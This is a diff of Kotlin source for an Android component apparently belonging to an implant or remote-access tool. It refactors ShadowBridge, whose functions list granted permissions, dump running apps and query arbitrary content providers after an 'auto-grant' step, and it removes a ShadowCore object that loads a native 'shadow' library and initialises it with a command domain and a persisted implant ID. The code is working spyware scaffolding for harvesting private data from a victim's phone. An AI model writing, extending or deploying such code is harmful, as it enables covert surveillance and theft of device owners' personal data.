@@ -34,7 +34,7 @@ object ShadowBridge {
 
     /** List permissions actually granted to this app (PackageManager, own UID). */
     fun grantedPermissions(): String {
-        val ctx = ShadowCore.appContext ?: return "no context"
+        val ctx = ShadowApp.appContext ?: return "no context"
         return try {
             val pkg = ctx.packageName
             val pm = ctx.packageManager
@@ -53,7 +53,7 @@ object ShadowBridge {
 
     /** Recents dump — "all the rest of the buttons" fodder. */
     fun runningApps(): String {
-        val ctx = ShadowCore.appContext ?: return "no context"
+        val ctx = ShadowApp.appContext ?: return "no context"
         return try {
             val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
             val procs = am.runningAppProcesses ?: emptyList()
@@ -68,7 +68,7 @@ object ShadowBridge {
      * Works once the matching runtime permission is granted (see startAutoGrant).
      */
     fun queryProvider(uri: String, projection: String, limit: Int): String {
-        val ctx = ShadowCore.appContext ?: return "no context"
+        val ctx = ShadowApp.appContext ?: return "no context"
         return try {
             val proj = if (projection.isBlank()) null else projection.split(",").toTypedArray()
             val cursor = ctx.contentResolver.query(
@@ -93,58 +93,6 @@ object ShadowBridge {
             "permission denied for $uri — run auto-grant first (${e.message})"
         } catch (e: Throwable) {
             "queryProvider error: ${e.message}"
-        }
-    }
-}
-
-object ShadowCore {
-    private const val TAG = "ShadowCore"
-
-    /** Context stashed at start() so JNI callbacks can reach PackageManager etc. */
-    @Volatile
-    var appContext: Context? = null
-        private set
-
-    init {
-        try {
-            System.loadLibrary("shadow")
-        } catch (e: Throwable) {
-            // UnsatisfiedLinkError is an Error, not Exception — must not kill the process
-            Log.e(TAG, "Failed to load libshadow.so", e)
-        }
-    }
-
-    // Native functions — keep externals private; public wrappers never throw
-    private external fun nativeInit(domain: String, implantId: String): Int
-    private external fun nativeLogEvent(entry: String)
-
-    fun logEvent(entry: String) {
-        try {
-            nativeLogEvent(entry)
-        } catch (e: Throwable) {
-            Log.e(TAG, "logEvent unavailable", e)
-        }
-    }
-
-    fun start(context: Context, domain: String) {
-        appContext = context.applicationContext
-
-        val prefs = context.getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
-        var implantId = prefs.getString("implant_id", null)
-
-        if (implantId == null) {
-            implantId = UUID.randomUUID().toString()
-            prefs.edit().putString("implant_id", implantId).apply()
-        }
-
-        Log.i(TAG, "Starting ShadowCore... ID: $implantId")
-        try {
-            val res = nativeInit(domain, implantId)
-            if (res != 0) {
-                Log.e(TAG, "nativeInit failed with code $res")
-            }
-        } catch (e: Throwable) {
-            Log.e(TAG, "nativeInit unavailable (native lib missing?)", e)
         }
     }
 }
